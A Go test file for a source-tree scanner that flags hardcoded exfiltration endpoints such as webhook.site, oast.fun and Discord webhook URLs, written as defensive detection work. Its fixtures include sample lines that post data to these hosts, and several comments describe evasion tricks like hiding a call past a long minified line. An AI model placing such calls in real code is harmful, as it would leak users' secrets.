package exfilwatch_test

import (
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/sarahmaeve/signatory/internal/signal/exfilwatch"
)

func TestScan_NoHitsOnCleanTree(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "main.go"), []byte("package main\nfunc main() {}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	hits, _, err := exfilwatch.Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(hits) != 0 {
		t.Fatalf("want 0 hits, got %d: %+v", len(hits), hits)
	}
}

func TestScan_HitOnWebhookSiteInInit(t *testing.T) {
	dir := t.TempDir()
	content := "package x\nfunc init() { post(\"https://webhook.site/abc\") }\n"
	if err := os.WriteFile(filepath.Join(dir, "init.go"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	hits, _, err := exfilwatch.Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
	}
	if hits[0].Host != "webhook.site" {
		t.Errorf("got host %q, want webhook.site", hits[0].Host)
	}
	if hits[0].File != "init.go" {
		t.Errorf("got file %q, want init.go", hits[0].File)
	}
	if hits[0].Line != 2 {
		t.Errorf("got line %d, want 2", hits[0].Line)
	}
}

func TestScanBytes_HitWithRelPathAndLine(t *testing.T) {
	content := []byte("line one\nfetch(\"https://webhook.site/abc\")\nclean line\n")
	hits := exfilwatch.ScanBytes("src/x.js", content)
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
	}
	if hits[0].Host != "webhook.site" {
		t.Errorf("got host %q, want webhook.site", hits[0].Host)
	}
	if hits[0].File != "src/x.js" {
		t.Errorf("got file %q, want src/x.js", hits[0].File)
	}
	if hits[0].Line != 2 {
		t.Errorf("got line %d, want 2", hits[0].Line)
	}
}

func TestScanBytes_NoHitOnCleanBytes(t *testing.T) {
	hits := exfilwatch.ScanBytes("a.go", []byte("package a\nfunc A() {}\n"))
	if len(hits) != 0 {
		t.Fatalf("want 0 hits, got %d: %+v", len(hits), hits)
	}
}

func TestScan_SubdomainCounts(t *testing.T) {
	dir := t.TempDir()
	content := "var u = \"https://abc-def-1234.webhook.site/x\"\n"
	if err := os.WriteFile(filepath.Join(dir, "x.go"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	hits, _, err := exfilwatch.Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
	}
}

func TestScan_MultipleDistinctHostsOneFile(t *testing.T) {
	dir := t.TempDir()
	content := "url1 = \"https://webhook.site/a\"\nurl2 = \"https://oast.fun/b\"\n"
	if err := os.WriteFile(filepath.Join(dir, "x.go"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	hits, _, err := exfilwatch.Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(hits) != 2 {
		t.Fatalf("want 2 hits, got %d: %+v", len(hits), hits)
	}
}

func TestScan_RecursesIntoSubdirs(t *testing.T) {
	dir := t.TempDir()
	sub := filepath.Join(dir, "pkg", "sub")
	if err := os.MkdirAll(sub, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(sub, "x.go"), []byte("\"webhook.site/abc\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	hits, _, err := exfilwatch.Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
	}
	want := filepath.Join("pkg", "sub", "x.go")
	if hits[0].File != want {
		t.Errorf("got file %q, want %q", hits[0].File, want)
	}
}

func TestScan_PathPatternMatchesPipedreamCapture(t *testing.T) {
	// pipedream.com is a broad service; only the v1/sources path family
	// is the capture variant. Hosts entry encodes that.
	dir := t.TempDir()
	content := "url := \"https://pipedream.com/v1/sources/abc\"\n"
	if err := os.WriteFile(filepath.Join(dir, "x.go"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	hits, _, err := exfilwatch.Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
	}
}

func TestScanBytes_LongLineDoesNotHideLaterHit(t *testing.T) {
	// A single line longer than the historical 1 MiB scanner cap, followed
	// by an exfil literal on the next line. The literal must still be found:
	// a pre-merge gate that silently stopped scanning after an over-long
	// line (e.g. a minified bundle) would let an attacker hide exfiltration
	// past it. Content stays within the caller's 2 MiB blob cap.
	var b strings.Builder
	b.WriteString(strings.Repeat("a", 1024*1024+512))
	b.WriteByte('\n')
	b.WriteString("fetch(\"https://webhook.site/abc\")\n")
	hits := exfilwatch.ScanBytes("bundle.js", []byte(b.String()))
	if len(hits) != 1 {
		t.Fatalf("want 1 hit after long line, got %d: %+v", len(hits), hits)
	}
	if hits[0].Host != "webhook.site" {
		t.Errorf("got host %q, want webhook.site", hits[0].Host)
	}
	if hits[0].Line != 2 {
		t.Errorf("got line %d, want 2", hits[0].Line)
	}
}

func TestScanBytes_HostInsideLongMinifiedLine(t *testing.T) {
	// The exfil literal is embedded within a single >1 MiB line, as in a
	// real minified bundle. It must still be found.
	var b strings.Builder
	b.WriteString(strings.Repeat("x", 700*1024))
	b.WriteString("=fetch(\"https://webhook.site/abc\");")
	b.WriteString(strings.Repeat("y", 700*1024))
	hits := exfilwatch.ScanBytes("vendor.min.js", []byte(b.String()))
	if len(hits) != 1 {
		t.Fatalf("want 1 hit inside long line, got %d: %+v", len(hits), hits)
	}
	if hits[0].Host != "webhook.site" {
		t.Errorf("got host %q, want webhook.site", hits[0].Host)
	}
}

func TestScanBytes_HostMatchIsCaseInsensitive(t *testing.T) {
	// Hostnames are case-insensitive; a literal scanner that only matched
	// lowercase is bypassed by WEBHOOK.SITE / WebHook.Site at zero attacker
	// cost (DNS resolves identically). The recorded host stays canonical.
	for _, variant := range []string{
		"post(\"https://WEBHOOK.SITE/abc\")",
		"post(\"https://WebHook.Site/abc\")",
	} {
		hits := exfilwatch.ScanBytes("x.js", []byte(variant))
		if len(hits) != 1 {
			t.Fatalf("variant %q: want 1 hit, got %d: %+v", variant, len(hits), hits)
		}
		if hits[0].Host != "webhook.site" {
			t.Errorf("variant %q: got host %q, want canonical webhook.site", variant, hits[0].Host)
		}
	}
}

func TestScan_HitOnDiscordWebhook(t *testing.T) {
	// Discord webhooks are the canonical gaming/cookie-stealer exfil
	// channel: the spadata PyPI stealer (June 2026) POSTed a decrypted
	// .ROBLOSECURITY cookie to a hardcoded discord.com/api/webhooks URL.
	// A webhook URL with an embedded id+token in published library
	// source is an exfil sink with no legitimate hardcoded purpose.
	dir := t.TempDir()
	content := "package x\nfunc init() { post(\"https://discord.com/api/webhooks/1501511921185325186/AbC-def\") }\n"
	if err := os.WriteFile(filepath.Join(dir, "init.go"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	hits, _, err := exfilwatch.Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
	}
	if hits[0].Host != "discord.com/api/webhooks" {
		t.Errorf("got host %q, want discord.com/api/webhooks", hits[0].Host)
	}
}

func TestScanBytes_HitOnLegacyDiscordAppWebhook(t *testing.T) {
	// discordapp.com is Discord's legacy domain — still live and used by
	// older stealers. It does NOT contain the substring "discord.com"
	// (the "app" breaks it), so it needs its own Hosts entry rather than
	// riding the discord.com/api/webhooks one.
	hits := exfilwatch.ScanBytes("steal.py", []byte("requests.post('https://discordapp.com/api/webhooks/123/tok', json=payload)\n"))
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
	}
	if hits[0].Host != "discordapp.com/api/webhooks" {
		t.Errorf("got host %q, want discordapp.com/api/webhooks", hits[0].Host)
	}
}

func TestScan_DiscordAPINonWebhookNotMatched(t *testing.T) {
	// Precision guard: the Hosts entry is the /api/webhooks/ delivery
	// path, NOT bare discord.com. A legitimate Discord API client
	// (discord.com/api/v10/...) must not hit — otherwise every Discord
	// library wrapper would false-positive, breaking exfilwatch's "a
	// literal hit is a strong malware signal" contract.
	dir := t.TempDir()
	content := "var u = \"https://discord.com/api/v10/users/@me\"\n"
	if err := os.WriteFile(filepath.Join(dir, "x.go"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	hits, _, err := exfilwatch.Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(hits) != 0 {
		t.Fatalf("want 0 hits for non-webhook Discord API, got %d: %+v", len(hits), hits)
	}
}

func TestScanReader_StreamsHitsWithoutBuffering(t *testing.T) {
	// ScanReader is the streaming entry point the artifact walker uses:
	// it scans an io.Reader (a bounded archive entry body) for host
	// literals without the caller first buffering the whole file into a
	// []byte the way ScanBytes requires.
	r := strings.NewReader("import os\nrequests.post('https://discord.com/api/webhooks/1/t')\n")
	hits := exfilwatch.ScanReader("spadata/__init__.py", r)
	if len(hits) != 1 {
		t.Fatalf("want 1 hit, got %d: %+v", len(hits), hits)
	}
	if hits[0].Host != "discord.com/api/webhooks" {
		t.Errorf("got host %q, want discord.com/api/webhooks", hits[0].Host)
	}
	if hits[0].File != "spadata/__init__.py" {
		t.Errorf("got file %q, want spadata/__init__.py", hits[0].File)
	}
	if hits[0].Line != 2 {
		t.Errorf("got line %d, want 2", hits[0].Line)
	}
}

func TestScan_OversizeFileSkippedButSmallFileStillHits(t *testing.T) {
	// Scan walks an attacker-influenceable source tree. The streaming
	// entry points delegate bounding to their callers, but the filesystem
	// walk is itself a caller: a single huge file with no newline would be
	// buffered whole by the line reader (ReadString) and exhaust memory.
	// An oversize file must be skipped (matching the artifact path's
	// over-MaxSize skip), while a normal-sized file in the same tree must
	// still be scanned — the cap targets size, not detection.
	dir := t.TempDir()

	// Single line, no newline, larger than the 2 MiB cap, with a host
	// literal at the end — models the no-newline OOM vector directly.
	oversize := strings.Repeat("a", 2<<20) + "post(\"https://webhook.site/evil\")"
	if err := os.WriteFile(filepath.Join(dir, "huge.min.js"), []byte(oversize), 0o644); err != nil {
		t.Fatal(err)
	}
	// A small file with a literal that MUST still be found.
	if err := os.WriteFile(filepath.Join(dir, "init.go"),
		[]byte("func init() { post(\"https://webhook.site/abc\") }\n"), 0o644); err != nil {
		t.Fatal(err)
	}

	hits, skipped, err := exfilwatch.Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(hits) != 1 {
		t.Fatalf("want exactly 1 hit (oversize file skipped, small file scanned), got %d: %+v", len(hits), hits)
	}
	if hits[0].File != "init.go" {
		t.Errorf("hit attributed to %q, want init.go (oversize huge.min.js must be skipped, not scanned)", hits[0].File)
	}
	// The skip must be recorded, not silent: an oversize file that quietly
	// dropped out could hide a sink past the cap.
	if len(skipped) != 1 {
		t.Fatalf("want exactly 1 recorded skip, got %d: %+v", len(skipped), skipped)
	}
	if skipped[0].File != "huge.min.js" || skipped[0].Reason != exfilwatch.SkipTooLarge {
		t.Errorf("got skip %+v, want {File:huge.min.js Reason:oversized}", skipped[0])
	}
}

func TestHosts_NonEmptyAndContainsWebhookSite(t *testing.T) {
	if len(exfilwatch.Hosts) == 0 {
		t.Fatal("Hosts is empty")
	}
	if !slices.Contains(exfilwatch.Hosts, "webhook.site") {
		t.Error("webhook.site missing from Hosts")
	}
}
